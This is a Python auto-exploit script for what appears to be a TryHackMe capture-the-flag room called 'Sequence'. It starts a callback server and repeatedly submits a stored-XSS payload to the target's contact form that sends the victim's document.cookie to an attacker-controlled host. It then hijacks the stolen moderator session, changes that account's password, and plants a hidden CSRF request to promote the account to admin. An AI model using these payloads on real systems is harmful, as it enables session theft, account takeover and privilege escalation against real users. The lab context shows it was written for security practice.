#!/usr/bin/env python3
"""
Full auto-pwn for THM Sequence room.

Flow:
  Phase 1 - Open firewall port, start callback HTTP server
  Phase 2 - Spray XSS to contact.php, wait for mod PHPSESSID callback
  Phase 3 - Validate session, extract Flag 1
  Phase 4 - Change mod password, submit CSRF-promote XSS
  Phase 5 - Wait 35s, re-login as mod, extract Flag 2

Usage:
  python auto_pwn.py --lhost 192.168.223.117
  python auto_pwn.py --lhost 192.168.223.117 --lport 9999 --timeout 180
"""

import argparse
import hashlib
import re
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, unquote, urlparse

import requests

# ──────────────────────────────────────────────────────────────────────────────
# Config
# ──────────────────────────────────────────────────────────────────────────────
TARGET   = "http://10.82.129.17"
MOD_USER = "mod"
MOD_PASS = "Pwned1337!"          # already changed in previous run
CSRF_PROMOTE = hashlib.md5(b"admin").hexdigest()  # 21232f...


# ──────────────────────────────────────────────────────────────────────────────
# Callback HTTP server (runs in background thread)
# ──────────────────────────────────────────────────────────────────────────────
class _Store:
    def __init__(self):
        self.phpsessid: str | None = None
        self.event = threading.Event()


_SID_RE = re.compile(r"PHPSESSID=([a-z0-9]+)", re.I)


def _make_handler(store: _Store):
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            qs  = parse_qs(urlparse(self.path).query)
            raw = unquote(qs.get("d", [""])[0])
            m   = _SID_RE.search(raw)
            if m and not store.phpsessid:
                store.phpsessid = m.group(1)
                print(f"\n  [!!!] Got PHPSESSID: {store.phpsessid}")
                store.event.set()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *_):
            pass  # silence

    return Handler


def start_callback_server(port: int, store: _Store) -> HTTPServer:
    srv = HTTPServer(("0.0.0.0", port), _make_handler(store))
    srv.allow_reuse_address = True
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


# ──────────────────────────────────────────────────────────────────────────────
# Windows firewall helper
# ──────────────────────────────────────────────────────────────────────────────
def open_firewall_port(port: int):
    rule = f"THM_autopwn_{port}"
    cmd  = (
        f'netsh advfirewall firewall add rule name="{rule}" '
        f'dir=in action=allow protocol=TCP localport={port}'
    )
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    ok = r.returncode == 0
    print(f"  firewall rule: {'added' if ok else 'already exists / skipped'}")


# ──────────────────────────────────────────────────────────────────────────────
# Requests helpers
# ──────────────────────────────────────────────────────────────────────────────
def _session_with_sid(sid: str) -> requests.Session:
    s = requests.Session()
    s.cookies.set("PHPSESSID", sid)
    return s


def check_session_flags(sid: str) -> tuple[requests.Session | None, list[str]]:
    s = _session_with_sid(sid)
    r = s.get(f"{TARGET}/dashboard.php", allow_redirects=True, timeout=10)
    if "login" in r.url:
        return None, []
    flags = re.findall(r"THM\{[^}]+\}", r.text)
    return s, flags


def get_settings_csrf(session: requests.Session) -> str | None:
    r = session.get(f"{TARGET}/settings.php", timeout=10)
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else None


def submit_contact(session: requests.Session, name: str, phone: str, msg: str) -> bool:
    try:
        r = session.post(f"{TARGET}/contact.php",
                         data={"name": name, "phone": phone, "message": msg},
                         timeout=10, allow_redirects=True)
        return r.status_code == 200
    except Exception:
        return False


def login(username: str, password: str) -> requests.Session | None:
    s = requests.Session()
    r = s.post(f"{TARGET}/login.php",
               data={"username": username, "password": password},
               allow_redirects=True, timeout=10)
    if "login" in r.url:
        return None
    return s


# ──────────────────────────────────────────────────────────────────────────────
# Payload builders
# ──────────────────────────────────────────────────────────────────────────────
def xss_cookie_steal(callback_url: str) -> str:
    """<img onerror> that exfiltrates document.cookie."""
    return (
        f"<img src=x onerror=\""
        f"var i=new Image();"
        f"i.src='{callback_url}?d='+encodeURIComponent(document.cookie);"
        f"document.body.appendChild(i)"
        f"\">"
    )


def xss_csrf_promote(promote_url: str) -> str:
    """<img src=> that triggers the CSRF promote GET request."""
    return f'<img src="{promote_url}" style="display:none">'


# ──────────────────────────────────────────────────────────────────────────────
# Phases
# ──────────────────────────────────────────────────────────────────────────────
def phase1_setup(lport: int) -> tuple[_Store, HTTPServer]:
    print(f"\n{'─'*60}")
    print(f"[Phase 1] Starting callback server on 0.0.0.0:{lport}")
    open_firewall_port(lport)
    store = _Store()
    srv   = start_callback_server(lport, store)
    print(f"  Server running ✓")
    return store, srv


def phase2_steal_cookie(store: _Store, callback_url: str,
                        timeout: int, interval: int) -> str:
    print(f"\n{'─'*60}")
    print(f"[Phase 2] XSS spray → stealing mod PHPSESSID")
    print(f"  Callback URL: {callback_url}")

    anon = requests.Session()
    payload = xss_cookie_steal(callback_url)
    deadline = time.time() + timeout
    rnd = 0

    while not store.event.is_set() and time.time() < deadline:
        rnd += 1
        print(f"  [round {rnd}] Submitting XSS to contact.php...", end=" ", flush=True)
        ok = submit_contact(anon, payload, payload, payload)
        print("ok" if ok else "FAIL")
        store.event.wait(timeout=interval)

    if not store.phpsessid:
        print("\n[!] Timeout – no PHPSESSID received.")
        print("    Possible causes:")
        print(f"    • Target can't reach {callback_url} (firewall?)")
        print("    • Try AttackBox IP instead of local VPN IP")
        sys.exit(1)

    return store.phpsessid


def phase3_flag1(phpsessid: str) -> tuple[requests.Session, str]:
    print(f"\n{'─'*60}")
    print(f"[Phase 3] Validating mod session, extracting Flag 1")
    mod_sess, flags = check_session_flags(phpsessid)
    if not mod_sess:
        print(f"[!] Session {phpsessid} is invalid / expired.")
        sys.exit(1)
    flag1 = flags[0] if flags else "not found in dashboard"
    print(f"\n  ★ FLAG 1: {flag1}")
    return mod_sess, flag1


def phase4_promote(mod_sess: requests.Session):
    print(f"\n{'─'*60}")
    print("[Phase 4] Changing mod password + submitting CSRF-promote XSS")

    # Change mod password so we can re-login after new session
    csrf_tok = get_settings_csrf(mod_sess)
    if csrf_tok:
        mod_sess.post(f"{TARGET}/settings.php",
                      data={"new_password": MOD_PASS, "csrf_token": csrf_tok},
                      timeout=10)
        print(f"  Password set to: {MOD_PASS}")
    else:
        print("  [!] Could not get settings CSRF token (password unchanged)")

    # Build promote URL and XSS payload
    promote_url = (
        f"{TARGET}/promote_coadmin.php"
        f"?username={MOD_USER}&csrf_token_promote={CSRF_PROMOTE}"
    )
    payload = xss_csrf_promote(promote_url)
    print(f"  Promote URL: {promote_url}")

    for i in range(5):   # 5 submissions = 5 chances for admin bot to see it
        ok = submit_contact(mod_sess, payload, payload, payload)
        print(f"  [submit {i+1}] {'ok' if ok else 'FAIL'}")
        time.sleep(1)

    print("\n  Waiting 40s for admin bot to process the review...")
    for remaining in range(40, 0, -5):
        print(f"    {remaining}s...", end="\r", flush=True)
        time.sleep(5)
    print("  Done waiting.              ")


def phase5_flag2() -> str | None:
    print(f"\n{'─'*60}")
    print("[Phase 5] Re-logging in as mod, checking for Flag 2")

    for attempt in range(4):
        s = login(MOD_USER, MOD_PASS)
        if not s:
            print(f"  [attempt {attempt+1}] Login failed, waiting 10s...")
            time.sleep(10)
            continue

        r_dash = s.get(f"{TARGET}/dashboard.php", timeout=10)
        all_flags = re.findall(r"THM\{[^}]+\}", r_dash.text)
        print(f"  Flags on dashboard: {all_flags}")

        # Flag 2 is whatever is NEW (not the mod flag)
        flag2 = next((f for f in all_flags if "M0d" not in f), None)
        if flag2:
            print(f"\n  ★ FLAG 2: {flag2}")
            return flag2

        # Maybe promote hasn't fired yet – wait more
        print(f"  Promote not reflected yet, waiting 15s...")
        time.sleep(15)

    print("  [!] Flag 2 not found after 4 attempts.")
    print("      The admin bot may need more time, or the promote URL format differs.")
    return None


# ──────────────────────────────────────────────────────────────────────────────
# Entry
# ──────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="THM Sequence auto-pwn")
    parser.add_argument("--lhost",   required=True,
                        help="Your VPN IP reachable from 10.82.129.17 (e.g. 192.168.223.117)")
    parser.add_argument("--lport",   type=int, default=8888,
                        help="Local port for XSS callback server (default: 8888)")
    parser.add_argument("--timeout", type=int, default=150,
                        help="Seconds to wait for XSS callback (default: 150)")
    parser.add_argument("--interval",type=int, default=8,
                        help="Seconds between XSS spray rounds (default: 8)")
    parser.add_argument("--skip-steal", metavar="PHPSESSID",
                        help="Skip Phase 1-2, use this existing PHPSESSID directly")
    args = parser.parse_args()

    callback_url = f"http://{args.lhost}:{args.lport}/c"

    print("=" * 60)
    print("  THM Sequence – Full Auto-Pwn")
    print(f"  Target  : {TARGET}")
    print(f"  Callback: {callback_url}")
    print("=" * 60)

    # ── Phases 1-3: steal mod session ──────────────────────────────────────
    if args.skip_steal:
        phpsessid = args.skip_steal
        print(f"\n[Skip] Using provided PHPSESSID: {phpsessid}")
        mod_sess, flag1 = phase3_flag1(phpsessid)
    else:
        store, _srv      = phase1_setup(args.lport)
        phpsessid        = phase2_steal_cookie(store, callback_url,
                                               args.timeout, args.interval)
        mod_sess, flag1  = phase3_flag1(phpsessid)

    # ── Phase 4-5: promote mod → admin, get Flag 2 ─────────────────────────
    phase4_promote(mod_sess)
    flag2 = phase5_flag2()

    # ── Summary ────────────────────────────────────────────────────────────
    print(f"\n{'='*60}")
    print("  RESULTS")
    print(f"{'='*60}")
    print(f"  Flag 1 (mod)  : {flag1}")
    print(f"  Flag 2 (admin): {flag2 or 'not captured yet'}")
    print(f"  mod PHPSESSID : {phpsessid}")
    print()
    print("  Next: Flag 3 (root) via SSRF → file upload → docker escape")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
